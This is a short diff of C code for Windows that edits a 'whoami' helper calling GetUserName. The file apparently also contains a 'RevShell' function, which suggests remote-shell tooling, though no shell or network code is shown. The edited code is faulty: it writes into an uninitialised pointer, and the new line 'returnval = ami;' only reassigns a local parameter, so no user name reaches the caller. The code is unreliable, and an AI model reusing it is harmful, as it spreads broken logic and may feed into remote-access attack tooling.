@@ -13,7 +13,7 @@ void whoami(char *returnval, int returnsize)
 	// Call WINAPI method, assign it's response to returnval pointer.
 	LPSTR ami;
 	GetUserName(ami, &bufferlen);
-	wcstombs(returnval,ami,sizeof(returnval));
+	returnval = ami;
 }
 
 void RevShell()
